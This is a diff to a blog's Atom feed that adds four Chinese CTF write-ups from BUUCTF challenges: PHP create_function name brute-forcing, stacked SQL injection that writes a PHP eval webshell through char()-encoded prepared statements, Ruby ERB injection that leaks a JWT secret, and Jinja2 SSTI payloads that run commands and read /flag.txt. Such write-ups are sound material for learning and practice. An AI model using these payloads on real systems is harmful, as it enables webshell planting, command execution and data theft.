@@ -99,6 +99,14 @@
     <category term="FFI预处理" />
     <category term="thinkphp3.2.4" />
     <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
     <entry>
         <id>http://odiws.github.io/2025/03/02/PyCalX-1/</id>
         <title>PyCalX_1</title>
@@ -3432,6 +3440,31 @@ only localhost can get flag!
         <updated>2024-08-17T12:22:01.000Z</updated>
     </entry>
     <entry>
+        <id>http://odiws.github.io/2024/08/16/SUCTF2018-annonymous/</id>
+        <title>[SUCTF2018]annonymous</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/16/SUCTF2018-annonymous/"/>
+        <content type="html">&lt;h2 id=&#34;suctf2018annonymous&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf2018annonymous&#34;&gt;#&lt;/a&gt; [SUCTF2018]annonymous&lt;/h2&gt;
+&lt;p&gt;这题代码很少，就这几行&lt;br&gt;
+首先创建了一个匿名函数，会输出 flag&lt;br&gt;
+ 接着 openssl_random_pseudo_bytes (32) 生成一个随机数，然后将其转成了十六进制，将其赋值给 $hash&lt;br&gt;
+ 接着 SUCTF_和 hash 拼接成一个新的函数名，函数会执行上面构造的匿名函数&lt;br&gt;
+所以，要想获得 flag 就只有两种办法，直接执行匿名函数，或者执行 SUCTF_和 hash 拼接成的新函数&lt;/p&gt;
+&lt;p&gt;下面的 func_name 可以传一个函数名进去并执行该函数&lt;/p&gt;
+&lt;p&gt;这题最初想着直接传 $MY 进去看能不能执行，结果不可以，那就只能执行下面那个函数名拼接的函数了，但是这样的话我们首先得破解它所生成的随机数，搜了很久都没有找到办法，这个好像是不可破解的。&lt;/p&gt;
+&lt;p&gt;转回去找 create_function 函数的问题，发现一般都是利用它进行代码注入，但这里明显不行。&lt;/p&gt;
+&lt;p&gt;后来看了别的大佬的 WP 才知道&lt;br&gt;
+ create_function () 这个函数的漏洞，他 create 之后会自动生成一个函数名为 %00lambda_[0-999]，后面的数字会逐步递增&lt;/p&gt;
+&lt;p&gt;create_function 是返回函数名称的，函数返回一个唯一的字符串函数名， 出现错误的话则返回 FALSE。&lt;/p&gt;
+&lt;p&gt;这么说这个函数也只是动态的创建了一个函数，而这个函数是有函数名的，也就是说，其实这并不是匿名的。 只是创建了一个全局唯一的函数而已。&lt;br&gt;
+详细的可以看看这篇 https://my.oschina.net/2016jyh/blog/810916&lt;/p&gt;
+&lt;p&gt;这道题中因为我们不知道前面有多少个匿名函数，所以得通过遍历数字来爆破，执行该函数&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdnL2FydGljbGUvZGV0YWlscy8xMTY3NDY4MDg=&#34;&gt;https://blog.csdn.net/cjdgg/article/details/116746808&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="create_function()函数" />
+        <updated>2024-08-16T04:22:19.000Z</updated>
+    </entry>
+    <entry>
         <id>http://odiws.github.io/2024/08/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFUpload%E9%A2%98/</id>
         <title>2019强网杯Upload题</title>
         <link rel="alternate" href="http://odiws.github.io/2024/08/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFUpload%E9%A2%98/"/>
@@ -3516,6 +3549,96 @@ only localhost can get flag!
         <category term="buuctf" />
         <category term="php反序列化" />
         <updated>2024-08-13T15:10:31.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/08/11/SUCTF2018-MultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
+        <title>[SUCTF2018]MultiSQL-MySQL预处理学习</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/11/SUCTF2018-MultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
+        <content type="html">&lt;h2 id=&#34;suctf2018multisql-mysql预处理学习&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf2018multisql-mysql预处理学习&#34;&gt;#&lt;/a&gt; [SUCTF2018] MultiSQL-MySQL 预处理学习&lt;/h2&gt;
+&lt;p&gt;[SUCTF 2018] MultiSQL-MySQL 预处理学习&lt;br&gt;
+进入题目后，注册账户登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;编辑头像可以上传文件，但是上传了 php 文件还是会变成 jpg 格式&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再看用户信息这里，id=2 那里可以随意更改，存在越权，1 就是 admin&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里接下来要用到 MySQL 的预处理，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vamllcm9uZzEyL3AvODg4MjUzNC5odG1s&#34;&gt;参考文章&lt;/span&gt;&lt;br&gt;
+ set&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; set @a=&#39;select version()&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&amp;gt; select @a;
++------------------+
+| @a               |
++------------------+
+| select version() |
++------------------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;set 的作用就是定义一个变量，变量的命名必须是 @开头。&lt;/p&gt;
+&lt;p&gt;prepare 和 execute&lt;br&gt;
+prepare 语句用于预定义一个语句，并可以指定预定义语句名称。execute 则是执行预定义语句。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;prepare prepare_name from “sql语句”
+
+execute prepare_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;示例&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; prepare t from @a;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+MariaDB [(none)]&amp;gt; execute t;
++-------------------+
+| version()         |
++-------------------+
+| 10.1.29-MariaDB-6 |
++-------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结合起来利用就是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; set @a=&#39;select version()&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&amp;gt; prepare t from @a;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+MariaDB [(none)]&amp;gt; execute t;
++-------------------+
+| version()         |
++-------------------+
+| 10.1.29-MariaDB-6 |
++-------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这题 fuzz 测试后发现过滤了 union，select ，&amp;amp;，|，过滤了 select 然后存在堆叠注入的可以使用预处理注入，尝试写入 shell，因为过滤了 select 等字符，使用 char () 绕过，需要执行的语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select ‘&amp;lt;?php eval($_POST[_]);?&amp;gt;’ into outfile ‘/var/www/html/favicon/shell.php’;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用脚本编程十进制：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;str=&amp;quot;select &#39;&amp;lt;?php eval($_POST[_]);?&amp;gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php&#39;;&amp;quot;
+len_str=len(str)
+for i in range(0,len_str):
+	if i == 0:
+		print(&#39;char(%s&#39;%ord(str[i]),end=&amp;quot;&amp;quot;)
+	else:
+		print(&#39;,%s&#39;%ord(str[i]),end=&amp;quot;&amp;quot;)
+print(&#39;)&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;利用该 payload 写入 shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接下来访问 shell 所在的位置并发送命令&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;flag 应该在 WelL_Th1s_14_fl4g&lt;/p&gt;
+&lt;p&gt;参考文章 ：[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdnL2FydGljbGUvZGV0YWlscy8xMTY2NTIwNTQ=&#34;&gt;SUCTF 2018] MultiSQL-MySQL 预处理学习_suctf2018 multi ssql-CSDN 博客&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sql二次注入" />
+        <updated>2024-08-11T13:38:12.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/08/09/GYCTF2020-Ez-Express/</id>
@@ -4073,6 +4196,137 @@ var_dump(getimagesize(&amp;quot;444.png&amp;quot;));
         <category term="buuctf" />
         <category term="c的预处理" />
         <updated>2024-08-01T12:15:24.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/07/30/Shop/</id>
+        <title>Shop</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/07/30/Shop/"/>
+        <content type="html">&lt;h2 id=&#34;sctf2019flag-shop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sctf2019flag-shop&#34;&gt;#&lt;/a&gt; [SCTF2019]Flag Shop&lt;/h2&gt;
+&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
+&lt;p&gt;点击 buy flag 试试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;提示没有足够的 jkl&lt;/p&gt;
+&lt;p&gt;这里可以点击 work 去赚取 jkl&lt;/p&gt;
+&lt;p&gt;正常点击要攒到 flag 怕是不可能，buu 请求过快也会报错&lt;/p&gt;
+&lt;p&gt;先抓包看看吧&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里不能修改 work 赚取的 jkl，尝试把 cookie 解码看看：直接修改发现出错，有密码。重新开始审计：&lt;/p&gt;
+&lt;p&gt;又回到最开始的地方。。&lt;/p&gt;
+&lt;p&gt;扫描一下有没有源码泄露之类的&lt;/p&gt;
+&lt;p&gt;发现 robots.txt&lt;/p&gt;
+&lt;p&gt;访问发现有 /filebak&lt;/p&gt;
+&lt;p&gt;发现 ruby 代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;require &#39;sinatra&#39;
+require &#39;sinatra/cookies&#39;
+require &#39;sinatra/json&#39;
+require &#39;jwt&#39;
+require &#39;securerandom&#39;
+require &#39;erb&#39;
+
+set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;
+
+FLAGPRICE = 1000000000000000000000000000
+ENV[&amp;quot;SECRET&amp;quot;] = SecureRandom.hex(64)
+
+configure do
+  enable :logging
+  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&amp;quot;a+&amp;quot;)
+  file.sync = true
+  use Rack::CommonLogger, file
+end
+
+get &amp;quot;/&amp;quot; do
+  redirect &#39;/shop&#39;, 302
+end
+
+get &amp;quot;/filebak&amp;quot; do
+  content_type :text
+  erb IO.binread __FILE__
+end
+
+get &amp;quot;/api/auth&amp;quot; do
+  payload = &amp;#123; uid: SecureRandom.uuid , jkl: 20&amp;#125;
+  auth = JWT.encode payload,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+  cookies[:auth] = auth
+end
+
+get &amp;quot;/api/info&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+  json(&amp;#123;uid: auth[0][&amp;quot;uid&amp;quot;],jkl: auth[0][&amp;quot;jkl&amp;quot;]&amp;#125;)
+end
+
+get &amp;quot;/shop&amp;quot; do
+  erb :shop
+end
+
+get &amp;quot;/work&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+  auth = auth[0]
+  unless params[:SECRET].nil?
+    if ENV[&amp;quot;SECRET&amp;quot;].match(&amp;quot;#&amp;#123;params[:SECRET].match(/[0-9a-z]+/)&amp;#125;&amp;quot;)
+      puts ENV[&amp;quot;FLAG&amp;quot;]
+    end
+  end
+
+  if params[:do] == &amp;quot;#&amp;#123;params[:name][0,7]&amp;#125; is working&amp;quot; then
+
+    auth[&amp;quot;jkl&amp;quot;] = auth[&amp;quot;jkl&amp;quot;].to_i + SecureRandom.random_number(10)
+    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+    cookies[:auth] = auth
+    ERB::new(&amp;quot;&amp;lt;script&amp;gt;alert(&#39;#&amp;#123;params[:name][0,7]&amp;#125; working successfully!&#39;)&amp;lt;/script&amp;gt;&amp;quot;).result
+
+  end
+end
+
+post &amp;quot;/shop&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+
+  if auth[0][&amp;quot;jkl&amp;quot;] &amp;lt; FLAGPRICE then
+
+    json(&amp;#123;title: &amp;quot;error&amp;quot;,message: &amp;quot;no enough jkl&amp;quot;&amp;#125;)
+  else
+
+    auth &amp;lt;&amp;lt; &amp;#123;flag: ENV[&amp;quot;FLAG&amp;quot;]&amp;#125;
+    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+    cookies[:auth] = auth
+    json(&amp;#123;title: &amp;quot;success&amp;quot;,message: &amp;quot;jkl is good thing&amp;quot;&amp;#125;)
+  end
+end
+
+
+def islogin
+  if cookies[:auth].nil? then
+    redirect to(&#39;/shop&#39;)
+  end
+end
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;稍微看了下&lt;/p&gt;
+&lt;p&gt;发现要 do 和 name 一致才能够弹出 secret&lt;/p&gt;
+&lt;p&gt;这里考察 Ruby ERB 注入（参考： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pkcTAzOTQxMjMvYXJ0aWNsZS9kZXRhaWxzLzg0NDM2OTQlRUYlQkMlODk=&#34;&gt;https://blog.csdn.net/zdq0394123/article/details/8443694）&lt;/span&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unless&lt;/span&gt; params&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SECRET&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;#&amp;#123;&lt;/span&gt;&lt;span class=&#34;token content&#34;&gt;params&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token regex-literal&#34;&gt;&lt;span class=&#34;token regex&#34;&gt;/[0-9a-z]+/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      puts &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;FLAG&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里要是 SECRET 参数存在则对其进行匹配，匹配到了就输出 flag&lt;/p&gt;
+&lt;p&gt;但这里既然有匹配，就可以用全局变量读出来了，也就是用 $` 来读取匹配前的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造下 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=&amp;lt;%=$&#39;%&amp;gt;&amp;amp;do=&amp;lt;%=$&#39;%&amp;gt; is working
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接使用好像不行。。&lt;/p&gt;
+&lt;p&gt;要把里面内容换位十六进制&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=%3c%25%3d%24%27%25%3e&amp;amp;do=%3c%25%3d%24%27%25%3e%20is%20working
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
+&lt;p&gt;又回显了一个 jwt 解码一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbmJsb2dzLmNvbS9jMGQxL3AvMTYxMTkzOTMuaHRtbA==&#34;&gt;https://cnblogs.com/c0d1/p/16119393.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="jwt身份验证" />
+        <updated>2024-07-30T15:07:06.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/07/28/2019-SVGMagic/</id>
@@ -4963,6 +5217,48 @@ username =1&#39; union select flag from flag #
         <category term="buuctf" />
         <category term="sql injection" />
         <updated>2024-06-16T06:35:04.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/06/13/Secret/</id>
+        <title>’[CISCN2019 华东南赛区]Double Secret‘</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/13/Secret/"/>
+        <content type="html">&lt;h2 id=&#34;ciscn2019-华东南赛区double-secret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华东南赛区double-secret&#34;&gt;#&lt;/a&gt; [CISCN2019 华东南赛区] Double Secret&lt;/h2&gt;
+&lt;p&gt;由标题可以知道：有两个 secret；尝试 /secret&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;网页显示是给个参数他就会给你加密（但是却是解密）&lt;/p&gt;
+&lt;p&gt;有两个 secret 可以在参数这里猜:&lt;/p&gt;
+&lt;p&gt;加？secret=12345 发现错误：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是 ssti 报错：盲猜 jinja2：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtODU1Zi5weQ==&#34;&gt;找 app.py&lt;/span&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt; if(secret==None):
+        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
+    rc=rc4_Modified.RC4(&amp;quot;HereIsTreasure&amp;quot;)   #解密
+    deS=rc.do_crypt(secret)
+ 
+    a=render_template_string(safe(deS))
+ 
+    if &#39;ciscn&#39; in a.lower():
+        return &#39;flag detected!&#39;  
+    return a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以发现是加了一个 rc4 的解密，密钥为：HereIsTreasure&lt;/p&gt;
+&lt;p&gt;我直接搞个加密 rc4 的密钥一样就可以了：&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;读 flag.txt  payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag.txt&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是要加一个 url 加密，在加一个加密所有字符（因为好像直接输入会丢字符）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="flask" />
+        <category term="ssti" />
+        <category term="rc4" />
+        <updated>2024-06-13T11:56:57.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/06/11/2019-EasyWeb/</id>
